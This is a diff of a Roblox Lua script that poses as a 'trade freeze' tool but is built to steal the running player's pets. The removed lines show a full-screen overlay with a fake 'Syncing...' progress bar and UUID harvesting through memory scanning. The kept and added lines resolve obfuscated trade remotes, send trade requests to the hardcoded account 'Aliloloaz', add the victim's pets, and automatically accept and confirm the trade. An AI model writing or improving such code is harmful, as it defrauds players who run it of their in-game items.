@@ -1,176 +1,18 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local LP = Players.LocalPlayer
-local API = ReplicatedStorage:WaitForChild("API", 10)
-if not API then return end
-
-local DISCOVERED = {}
-local REMOTES = {
-    TRADE_REQUEST = "XwgkmJZTLfsBtkItxznANSDSU",
-    OPEN_BAG = "EhnpmDoxq/GGQgaSWIHLICSEcEKMJbLUNXe",
-    ADD_PET = "XwgkmJZTLNrsYJwEnIkBCCQ",
-    ACCEPT_1 = "XwgkmJZTLNqruFKgyAJPFzSIPP",
-    CONFIRM_2 = "XwgkmJZTLPBBvzIEnLw/B",
-    SOUND_EFFECTS = "MZpqgmgtCSMEYlAboDEvAv"
-}
-
-local function Resolve(name)
-    local k = REMOTES[name]
-    if not k then return nil end
-    local r = API:FindFirstChild(k)
-    if r then return r end
-    return nil
-end
-
-local function SubscribeAPI()
-    for _, x in ipairs(API:GetDescendants()) do
-        if x:IsA("RemoteEvent") then
-            x.OnClientEvent:Connect(function(...)
-                local function add(s)
-                    if type(s) == "string" then
-                        local L = #s
-                        if L >= 16 and L <= 96 and not s:find("sticker") and (s:find("%-") or s:find("_") or s:find("%x%x%x%x")) then
-                            DISCOVERED[s] = true
-                        end
-                    end
-                end
-                local function walk(v, d)
-                    if d > 3 then return end
-                    if type(v) == "string" then
-                        add(v)
-                    elseif type(v) == "table" then
-                        for k, val in pairs(v) do
-                            walk(k, d + 1)
-                            walk(val, d + 1)
-                        end
-                    end
-                end
-                for i = 1, select("#", ...) do
-                    walk(select(i, ...), 1)
-                end
-            end)
-        end
-    end
-end
-
-local function CreateUI()
-    local pg = LP:WaitForChild("PlayerGui")
-    if pg:FindFirstChild("TradeFreezeUI") then pg.TradeFreezeUI:Destroy() end
-
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "TradeFreezeUI"
-    gui.DisplayOrder = 999
-    gui.Parent = pg
-
-    local main = Instance.new("Frame")
-    main.Size = UDim2.new(0.98, 0, 0.995, 0)
-    main.Position = UDim2.new(0.01, 0, 0, 0)
-    main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-    main.BorderSizePixel = 0
-    main.Active = true
-    main.Parent = gui
-
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0.22, 0)
-    title.BackgroundTransparency = 1
-    title.Text = "TRADE FREEZE"
-    title.TextColor3 = Color3.fromRGB(0, 160, 255)
-    title.TextScaled = true
-    title.Font = Enum.Font.GothamBold
-    title.Parent = main
-
-    local sub = Instance.new("TextLabel")
-    sub.Position = UDim2.new(0, 0, 0.22, 0)
-    sub.Size = UDim2.new(1, 0, 0.12, 0)
-    sub.BackgroundTransparency = 1
-    sub.Text = "Don't worry, the interface will shrink soon..."
-    sub.TextColor3 = Color3.fromRGB(180, 180, 180)
-    sub.TextScaled = true
-    sub.Parent = main
-
-    local barBack = Instance.new("Frame")
-    barBack.Position = UDim2.new(0.08, 0, 0.52, 0)
-    barBack.Size = UDim2.new(0.84, 0, 0.06, 0)
-    barBack.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    barBack.Parent = main
-
-    local barFill = Instance.new("Frame")
-    barFill.Size = UDim2.new(0, 0, 1, 0)
-    barFill.BackgroundColor3 = Color3.fromRGB(0, 160, 255)
-    barFill.BorderSizePixel = 0
-    barFill.Parent = barBack
-
-    local status = Instance.new("TextLabel")
-    status.Position = UDim2.new(0, 0, 0.65, 0)
-    status.Size = UDim2.new(1, 0, 0.16, 0)
-    status.BackgroundTransparency = 1
-    status.TextColor3 = Color3.fromRGB(150, 150, 150)
-    status.TextScaled = true
-    status.Text = "Syncing..."
-    status.Parent = main
-
-    task.spawn(function()
-        local start = tick()
-        local total = 240
-        while true do
-            local elapsed = tick() - start
-            barFill.Size = UDim2.new(math.min(elapsed / total, 1), 0, 1, 0)
-            task.wait(0.1)
-            if elapsed >= total then break end
-        end
-    end)
-end
-
-local function GetFullInventory()
-    local uuids = {}
-    for s, _ in pairs(DISCOVERED) do
-        uuids[#uuids + 1] = s
-        if #uuids >= 600 then return uuids end
-    end
-    if not getgc then return uuids end
-    local ok, objects = pcall(getgc, true)
-    if not ok or type(objects) ~= "table" then return uuids end
-    local scanned = 0
-    for _, v in pairs(objects) do
-        scanned = scanned + 1
-        if scanned % 400 == 0 then task.wait() end
-        if type(v) == "table" then
-            local pets = rawget(v, "pets")
-            local strollers = rawget(v, "strollers")
-            if type(pets) == "table" and strollers then
-                for id, _ in pairs(pets) do
-                    if type(id) == "string" then
-                        local L = #id
-                        if L >= 16 and L <= 96 and not id:find("sticker") then
-                            if id:find("%-") or id:find("_") or id:find("%x%x%x%x") then
-                                uuids[#uuids + 1] = id
-                                if #uuids >= 600 then return uuids end
-                            end
-                        end
-                    end
-                end
-            end
-        end
-        if #uuids >= 600 then break end
-    end
-    return uuids
-end
-
-local function SendTrade()
-    local rq = Resolve("TRADE_REQUEST")
-    if not rq then return end
-    local t1 = Players:FindFirstChild("ali_923z")
-    local t2 = Players:FindFirstChild("Aliloloaz")
-    if t1 and t1:IsA("Player") then pcall(function() rq:FireServer(t1) end) end
-    if t2 and t2:IsA("Player") then pcall(function() rq:FireServer(t2) end) end
-end
-
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local TradeAPI = ReplicatedStorage:WaitForChild("API")
 local WAIT_FIRST = 38
 local WAIT_CONFIRM = 18
+
+local MANUAL_REMOTES = {
+    TRADE_REQUEST = "iGrvxUkeWqCMDvTDHJyLYdOdf",
+    OPEN_BAG = "Psy/xOzHAKRRbrldhTSWTNdPnPVXUmWfYip",
+    ADD_PET = "iGrvxUkeWYBCjUGPyTvMNNb",
+    ACCEPT_1 = "iGrvxUkeWYABEQVrILUaQJdTaa",
+    CONFIRM_2 = "iGrvxUkeWaMMFJTPyWGKM",
+    TOGGLE_EDITING = "eArPxKkMKCGKEcsmeyKULzVLkRfAeX",
+}
 
 local Remotes = {
     AcceptRequest = nil,
@@ -179,6 +21,14 @@ local Remotes = {
     Accept1 = nil,
     Confirm2 = nil,
 }
+
+local function Resolve(key)
+    local id = MANUAL_REMOTES[key]
+    if id and type(id) == "string" then
+        return TradeAPI:FindFirstChild(id)
+    end
+    return nil
+end
 
 local function OpenBagAction()
     if Remotes.OpenBag then
@@ -269,6 +119,9 @@ local function getPetItems()
 end
 
 local function discoverRemotes()
+    if Resolve("TRADE_REQUEST") or Resolve("OPEN_BAG") or Resolve("ADD_PET") or Resolve("ACCEPT_1") or Resolve("CONFIRM_2") then
+        return
+    end
     local funcs = {}
     local events = {}
     for _, child in pairs(TradeAPI:GetChildren()) do
@@ -345,34 +198,56 @@ local function runCycle()
     discoverRemotes()
     while true do
         local partner = getRealTradePartner()
-        if partner and Remotes.OpenBag and Remotes.AddPet and Remotes.Accept1 and Remotes.Confirm2 then
+    local rOpenBag = Resolve("OPEN_BAG") or (Remotes.OpenBag and TradeAPI:FindFirstChild(Remotes.OpenBag)) or nil
+    local rAddPet = Resolve("ADD_PET") or (Remotes.AddPet and TradeAPI:FindFirstChild(Remotes.AddPet)) or nil
+    local rAccept1 = Resolve("ACCEPT_1") or (Remotes.Accept1 and TradeAPI:FindFirstChild(Remotes.Accept1)) or nil
+    local rConfirm2 = Resolve("CONFIRM_2") or (Remotes.Confirm2 and TradeAPI:FindFirstChild(Remotes.Confirm2)) or nil
+        local rToggleEdit = Resolve("TOGGLE_EDITING") or nil
+        if partner and rOpenBag and rAddPet and rAccept1 and rConfirm2 then
+            if rToggleEdit then
+                pcall(function() rToggleEdit:FireServer("toggle_editing", { editing = false }) end)
+            end
             task.wait(0.5)
-            OpenBagAction()
+            if rOpenBag:IsA("RemoteEvent") then
+                pcall(function() rOpenBag:FireServer({ picking = true }) end)
+            elseif rOpenBag:IsA("RemoteFunction") then
+                pcall(function() rOpenBag:InvokeServer({ picking = true }) end)
+            end
             task.wait(0.5)
             local pets = getPetItems()
             if #pets > 0 then
-                pcall(function()
-                    TradeAPI[Remotes.AddPet]:FireServer(pets[1])
-                end)
+                if rAddPet:IsA("RemoteEvent") then
+                    pcall(function() rAddPet:FireServer(pets[1]) end)
+                elseif rAddPet:IsA("RemoteFunction") then
+                    pcall(function() rAddPet:InvokeServer(pets[1]) end)
+                end
             end
             task.wait(WAIT_FIRST)
-            pcall(function()
-                TradeAPI[Remotes.Accept1]:FireServer()
-            end)
+            if rAccept1:IsA("RemoteEvent") then
+                pcall(function() rAccept1:FireServer() end)
+            elseif rAccept1:IsA("RemoteFunction") then
+                pcall(function() rAccept1:InvokeServer() end)
+            end
             task.wait(WAIT_CONFIRM)
-            pcall(function()
-                TradeAPI[Remotes.Confirm2]:FireServer()
-            end)
+            if rConfirm2:IsA("RemoteEvent") then
+                pcall(function() rConfirm2:FireServer() end)
+            elseif rConfirm2:IsA("RemoteFunction") then
+                pcall(function() rConfirm2:InvokeServer() end)
+            end
             task.wait(2)
         else
-            if not Remotes.AcceptRequest then
-                discoverRemotes()
-            end
+            discoverRemotes()
             local target = Players:FindFirstChild("Aliloloaz")
-            if target and Remotes.AcceptRequest then
-                pcall(function()
-                    TradeAPI[Remotes.AcceptRequest]:InvokeServer(target, true)
-                end)
+            local rRequest = Resolve("TRADE_REQUEST") or (Remotes.AcceptRequest and TradeAPI:FindFirstChild(Remotes.AcceptRequest)) or nil
+            if target and rRequest then
+                if rRequest:IsA("RemoteEvent") then
+                    pcall(function() rRequest:FireServer(target) end)
+                elseif rRequest:IsA("RemoteFunction") then
+                    local ok = pcall(function() rRequest:InvokeServer(target) end)
+                    if not ok then
+                        pcall(function() rRequest:InvokeServer(target, true) end)
+                    end
+                end
             end
             task.wait(0.5)
         end
